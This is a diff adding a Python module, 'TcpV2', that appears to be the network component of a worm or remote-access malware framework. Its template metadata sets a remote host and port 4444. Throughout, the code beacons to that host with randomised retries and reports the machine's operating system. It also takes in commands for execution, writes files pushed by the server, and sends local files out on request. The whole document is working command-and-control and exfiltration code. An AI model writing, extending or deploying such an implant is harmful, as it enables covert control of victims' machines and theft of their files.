@@ -1,0 +1,260 @@
+#!name##TcpV2
+#!types##module
+#!info##[PyS] Enables communication via TCP sockets. Messages are exchanged in JSON format encoded with Base64. Supports downloading and uploading multiple files simultaneously by creating multiple sockets synchronized with the server. Requires a "default" type server to function properly.
+#!reqSMod##Chameleon
+#!reqVar##IP_ADDR##Host address.##str
+#!reqVar##PORT##Host port number##int
+#!setVar##PORT##4444##int
+#!reqVar##FORMAT_CODE##Message encoding format.##str
+#!reqVar##TCP_SOCK_TO##Socket Timeout##int
+#!reqVar##RAW_LEN##raw_len vaule in bytes##int
+#!reqVar##TCP_SOCK_SEPARATOR##Message splitting separator##str
+#!TAGS##[PyS]
+
+import os
+import socket
+import threading
+import platform
+import json
+import string
+from time import sleep
+from random import randint
+from typing import Union
+
+
+class TcpV2(threading.Thread):
+    MTYPES = "conn"
+    def __init__(self, worm: object):
+        super().__init__()
+        self.worm = worm
+        self.addr = ("{{IP_ADDR}}", {{PORT}})
+        self.format = "{{FORMAT_CODE}}"
+        self.raw_len = {{RAW_LEN}}
+        self.sep = "{{TCP_SOCK_SEPARATOR}}"
+        self._sock_to = {{TCP_SOCK_TO}}
+
+
+        self.is_conn = False
+        self._try_conn = False
+        self.cham = Chameleon(self.format)
+        self._system = {"system" : f"{platform.uname().system}#{platform.uname().release}"}
+        self.in_cmd = self.worm.in_cmd
+        self.chars = string.ascii_letters
+        self.to_send = {}
+        self.id_len = 25
+
+    def _connect(self) -> bool:
+        try:
+            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client.connect(self.addr)
+            self.is_conn = True
+            return True
+        except:
+            self.is_conn = False
+            return False
+    
+    def _conn(self) -> None:
+        if self._try_conn:
+            return
+        self._try_conn = True
+        while self.worm.working:
+            if self._connect():
+                self._info()
+                self.client.settimeout(self._sock_to)
+                self.recive_raw()
+            sleep(randint(2, 7))
+    
+    def connect(self) -> None:
+        if not self.is_conn:
+            self._conn()
+    
+    def unpack_data(self, data: bytes) -> list:
+        o = self.cham.decrypt(data)
+        out = []
+        for m in o.split(self.sep):
+            if m == "" or m == " ":
+                continue
+            out.append(m)
+        clean = []
+        for o in out:
+            try:
+                d = json.loads(o)
+                clean.append(d)
+            except json.JSONDecodeError:
+                pass
+        out = []
+        for c in clean:
+            if not self.mod_exec_cmd(c):
+                return []
+            cmd = f"{c['cmd']} {c['data']}"
+            out.append(cmd)
+        return out
+
+    def _info(self) -> None:
+        inf = {"types": "info", "data": self._system}
+        self._send_data(inf)
+    
+    def scout(self) -> dict:
+        return {}
+    
+    def recive_raw(self) -> None:
+        msg = b""
+        while self.is_conn:
+            if not self.worm.working:
+                break
+            try:
+                recv = self.client.recv(self.raw_len)
+            except TimeoutError:
+                continue
+            except:
+                break
+            if recv:
+                if len(recv) < self.raw_len:
+                    msg += recv
+                    rmsg = self.unpack_data(msg)
+                    for rm in rmsg:
+                        self.in_cmd.put(rm)
+                    msg = b""
+                else:
+                    msg += recv
+            else:
+                break
+        try:
+            self.client.close()
+        except:
+            pass
+        self.is_conn = False
+    
+    def _send_data(self, data: dict) -> None:
+        try:
+            data = json.dumps(data)
+        except json.JSONDecodeError:
+            return
+        data = self.sep + data
+        data = self.cham.encrypt(data)
+        sleep(0.1)
+        try:
+            self.client.sendall(data)
+        except:
+            pass
+    
+    def send_data(self, data: Union[str, dict]) -> None:
+        if not isinstance(data, dict):
+            data = {"data" : data}
+        self._send_data(data)
+     
+    def _send_msg(self, msg: str) -> None:
+        data = {"types" : "msg", "data" : msg}
+        self._send_data(data)
+
+    
+    def send_msg(self, msg: str) -> None:
+        self._send_msg(msg)
+    
+    def _download_file(self, fname: str, port: str, flen: str) -> None:
+        try:
+            port = int(port)
+            flen = int(flen)
+        except ValueError:
+            return
+        
+        xsock = self.make_xsock(self.addr[0], port)
+        if not xsock:
+            return
+        data = b""
+        while len(data) < flen:
+            try:
+                recv = xsock.recv(flen)
+            except:
+                return
+            if not recv:
+                return
+            else:
+                data += recv
+        try:
+            with open(os.path.join(os.getcwd(), fname), "wb") as file:
+                file.write(data)
+        except:
+            pass
+    
+    def download_file(self, cmd: dict) -> None:
+        down = threading.Thread(target=self._download_file, args=(str(cmd.get("fname")), str(cmd.get("port")), str(cmd.get("flen"))), daemon=True)
+        down.start()
+        
+            
+    def make_xsock(self, ip: str, port : int) -> Union[object, None]:
+        try:
+            xsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            xsock.connect((ip, port))
+            return xsock
+        except:
+            return None
+    
+    def gen_id(self, count: int = 25) -> str:
+        idd = ""
+        while len(idd) < count:
+            idd += self.chars[randint(0, len(self.chars) - 1)]
+        return idd
+        
+    
+    def send_file(self, fpath: str, name: str = None, types: str = None) -> None:
+        if not os.path.exists(fpath):
+            return
+        flen = os.stat(fpath).st_size
+        file_id = self.gen_id(self.id_len)
+        if not name:
+            name = os.path.basename(fpath)
+        data = {"name" : name, "file_len": flen, "file_id" : file_id, "types" : types}
+        self.to_send[file_id] = fpath
+        self._send_data({"types" : "down", "data" : data})
+    
+    def get_file(self, name: str) -> None:
+        fpath = os.path.join(os.getcwd(), name)
+        if not os.path.exists(fpath):
+            self.send_msg("Error: File does not exists")
+            return
+        self.send_file(fpath, name)
+    
+    def _send_file(self, data: dict) -> None:
+        fpath = self.to_send.get(data.get("file_id"))
+        if not fpath:
+            return
+        ip = data.get("ip")
+        try:
+            port = int(data.get("port"))
+        except:
+            return
+        xsock = self.make_xsock(ip, port)
+        if not xsock:
+            return
+        try:
+            with open(fpath, "rb") as f:
+                xsock.sendfile(f, 0)
+        except:
+            return
+        del self.to_send[data.get("file_id")]
+    
+    def mod_exec_cmd(self, cmd: dict) -> bool:
+        com = cmd.get("cmd")
+        if not com:
+            return True
+        match com:
+            case "down":
+                self.download_file(cmd)
+            case "packer":
+                self._send_file(cmd)
+            case "get":
+                self.get_file(str(cmd.get("data")))
+            case _:
+                return True
+
+    def help(self) -> str:
+        h = "'get <file_name>' - Send file to server. Ex: 'get abc.jpeg'\n"
+        return h
+    
+    def exec_cmd(self, cmd: list) -> None:
+        pass
+
+    def run(self) -> None:
+        self.connect()
+
